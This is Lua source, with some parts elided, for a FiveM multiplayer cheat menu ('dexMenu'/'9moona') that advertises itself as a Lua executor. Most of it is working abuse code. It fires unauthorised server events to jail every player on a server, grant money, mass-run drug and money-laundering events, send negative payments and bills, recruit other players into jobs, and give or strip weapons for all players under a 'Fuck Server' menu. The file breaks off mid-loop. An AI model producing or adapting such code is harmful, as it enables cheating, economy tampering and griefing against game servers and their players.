...
function dexMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
		...
		function()
			while true do
				...
				local ra = RGBRainbow(1.0)-- RGB MENU DISABLED // NiT34ByTe
				 menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100} --RGB MENU DISABLED // NiT34ByTe - Culoare titlu
...
function dexMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		dexMenu.CreateMenu(id, menus[parent].title)
...
function dexMenu.CurrentMenu()
	return currentMenu
end

function dexMenu.OpenMenu(id)
	if id and menus[id] then
...
function dexMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function dexMenu.IsAnyMenuOpened()
...
function dexMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
...
function dexMenu.Button(text, subText)
...
function dexMenu.MenuButton(text, id)
	if menus[id] then
		if dexMenu.Button(text) then
			setMenuVisible(currentMenu, false)
...
function dexMenu.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if dexMenu.Button(text, checked) then
		bool = not bool
...
function dexMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	...
	if dexMenu.Button(text, selectedItem) then
...
function dexMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function dexMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function dexMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function dexMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function dexMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function dexMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
...
function dexMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function dexMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function dexMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
...
function dexMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function dexMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function dexMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function dexMenu.SetMenuButtonPressedSound(id, name, set)
...
Citizen.CreateThread(
	function()
		while Enabled do
			...
			if banallusers then
				for i = 0, 450 do
				 TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5000000)
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "discord.gg/jPKXwp - The best lua executor from all! Write to DoDo#1446#1446", 5000000)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "discord.gg/jPKXwp - The best lua executor from all! Write to DoDo#1446")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "discord.gg/jPKXwp - The best lua executor from all! Write to DoDo#1446")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "discord.gg/jPKXwp - The best lua executor from all! Write to DoDo#1446")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "discord.gg/jPKXwp - The best lua executor from all! Write to DoDo#1446")
					end
				end
			...
			if esxdestroy then
				for i = 0, 450 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
--						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "tu sobie wpisujesz powod mandatu", "tu sobie wpisujesz powod mandatu", 10000000)
				end
			end
...
Citizen.CreateThread(
	function()
		...
		dexMenu.CreateMenu("MainMenu", "<FONT COLOR='#000000'>9moona")
		dexMenu.SetSubTitle("MainMenu", "Have Fun")
		dexMenu.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		dexMenu.CreateSubMenu("Xposed", "MainMenu", "Xposed")
		dexMenu.CreateSubMenu("Destroyer", "MainMenu", "Destroyer")
		dexMenu.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		dexMenu.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		dexMenu.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		dexMenu.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		dexMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		dexMenu.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		dexMenu.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		dexMenu.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		dexMenu.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		dexMenu.CreateSubMenu("ESXMoney", "ServerMenu", "ESX Money Options")
		dexMenu.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		dexMenu.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		dexMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		dexMenu.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		dexMenu.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")

		local SelectedPlayer

		while Enabled do
			if dexMenu.IsMenuOpened("MainMenu") then
			    drawNotification("<FONT COLOR='#FFFF03'>Working... <FONT COLOR='#FDA618'>DexMenu!")
				drawNotification("<FONT COLOR='#0026FE'>Official <FONT COLOR='#FE0000'> Discord server: ~n~ ~r~9m9m")
				   if dexMenu.MenuButton("<FONT COLOR='#0FF9FC'> Player Menu                                    <FONT COLOR='#00FED3'> →", "SelfMenu") then
				elseif dexMenu.MenuButton("<FONT COLOR='#FC0F49'> Online Players                                 <FONT COLOR='#00FED3'> →", "OnlinePlayerMenu") then
				elseif dexMenu.MenuButton("<FONT COLOR='#B50FFC'> World Menu                                   <FONT COLOR='#00FED3'> →", "Xposed") then
				elseif dexMenu.MenuButton("<FONT COLOR='#0FFCD5'> Teleport Menu                                <FONT COLOR='#00FED3'> →", "TeleportMenu") then
				elseif dexMenu.MenuButton("<FONT COLOR='#1AFC0F'> Vehicles Menu                                <FONT COLOR='#00FED3'> →", "VehMenu") then
				elseif dexMenu.MenuButton("<FONT COLOR='#FFFB0C'> Weapons Menu                              <FONT COLOR='#00FED3'> →", "WepMenu") then
				elseif dexMenu.MenuButton("<FONT COLOR='#FF0000'> Fuck Server                                     <FONT COLOR='#00FED3'> →", "Destroyer") then
				elseif dexMenu.MenuButton("<FONT COLOR='#0B4DFB'> LUA MENU                                 <FONT COLOR='#00FED3'> →", "ServerMenu") then
				elseif dexMenu.Button("~h~ <FONT COLOR='#F95555'>OFF ~s~Menu") then
					Enabled = false
				end

				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("SelfMenu") then
				if
					dexMenu.CheckBox(
						"~h~~g~God ~h~~r~Mode",
						Godmode,
				 ...
				 then
				elseif dexMenu.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif dexMenu.Button("~s~Revive ~h~~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif dexMenu.Button("~h~~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif dexMenu.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif dexMenu.Button("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif dexMenu.Button("~w~~h~Set thirst to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif dexMenu.Button("~h~~b~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif dexMenu.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				dexMenu.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				dexMenu.CheckBox(
					"~h~Super Jump",
				...
				then
				elseif
					 dexMenu.CheckBox("~h~Speed Demon",SpeedDemon,
				...
				then
				elseif
				dexMenu.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		dexMenu.Display()
			elseif dexMenu.IsMenuOpened("TeleportMenu") then
				if dexMenu.Button("~h~Teleport ~h~~g~Waypoint") then
				TeleportToWaypoint()
			 elseif dexMenu.Button("~h~Teleport ~h~~g~Vehicle") then
		...
		dexMenu.Display()
			elseif dexMenu.IsMenuOpened("Xposed") then
			if
				dexMenu.CheckBox(
				"~h~ESP",
				esp,
		...
		dexMenu.Display()
		elseif dexMenu.IsMenuOpened("Destroyer") then
		if dexMenu.Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
				...
				elseif dexMenu.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
	...
	then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("WepMenu") then
				if dexMenu.MenuButton("~h~Specific Weapon", "SingleWepMenu") then
				elseif dexMenu.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif dexMenu.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif dexMenu.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
			...
			elseif
				...
				elseif
				 ...
				 then
				 elseif
					 dexMenu.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 dexMenu.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if dexMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("VehMenu") then
				if dexMenu.Button("~h~~g~Spawn Vehicle") then
				...
				elseif dexMenu.Button("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif dexMenu.Button("~h~Max Tuning") then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("ServerMenu") then
				if dexMenu.MenuButton("~s~Menu ~h~~r~RECRUIT PLAYERS ~g~(NEW)", "RecrutarPlayers") then
				elseif dexMenu.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif dexMenu.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif dexMenu.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif dexMenu.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end

				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("ESXBoss") then
				if dexMenu.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif dexMenu.Button("~g~~h~ESX ~y~Custom Boss Menu") then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("ESXMoney") then
			if dexMenu.Button("~g~~h~MONEY ~s~1") then
			local result = KeyboardInput("Enter money amount", "", 10000)
				...
				elseif dexMenu.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
				elseif dexMenu.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
			...
			dexMenu.Display()
				elseif dexMenu.IsMenuOpened("ESXMisc") then
				    if dexMenu.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
				...
				elseif dexMenu.Button("~g~~h~ESX ~w~Get all licenses Drive") then
				...
				elseif dexMenu.Button("~h~Send Discord Message") then
				...
				elseif dexMenu.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("MiscServerOptions") then
				if dexMenu.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif dexMenu.Button("~h~Send Police Car Advert") then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("VRPOptions") then
				if dexMenu.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif dexMenu.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif dexMenu.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif dexMenu.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif dexMenu.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("ESXDrugs") then
				if dexMenu.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif dexMenu.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif dexMenu.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif dexMenu.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif dexMenu.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif dexMenu.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif dexMenu.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif dexMenu.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif dexMenu.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif dexMenu.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif dexMenu.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif dexMenu.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif dexMenu.Button("~h~~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif dexMenu.Button("~r~~h~Stop all ~c~(Drugs)") then
...
--end
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and dexMenu.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ ", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("RecrutarPlayersOptions") then
				dexMenu.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if dexMenu.Button("~s~Recruit~c~~h~ Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif dexMenu.Button("~s~Recruit~b~~h~ Police") then
				--PolicePlayers()
			elseif dexMenu.Button("~s~Recruit~c~~h~ Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif dexMenu.Button("~s~Recruit~p~~h~ Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif dexMenu.Button("~s~Recruit~r~~h~ Inem") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif dexMenu.Button("~h~Custom Recruit") then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and dexMenu.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("PlayerOptionsMenu") then
				dexMenu.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if dexMenu.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif dexMenu.Button("Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif dexMenu.Button("~g~Give ~s~Money") then
				...
				elseif dexMenu.Button('Fire') then
				    FirePlayer(SelectedPlayer)
					elseif dexMenu.Button("Jail") then		
				...
				elseif dexMenu.Button("Unjail") then
				...
				elseif dexMenu.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif dexMenu.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif dexMenu.Button("Spawn Vehicle") then
				...
				dexMenu.Display()
			elseif dexMenu.IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if dexMenu.Button(allWeapons[i]) then
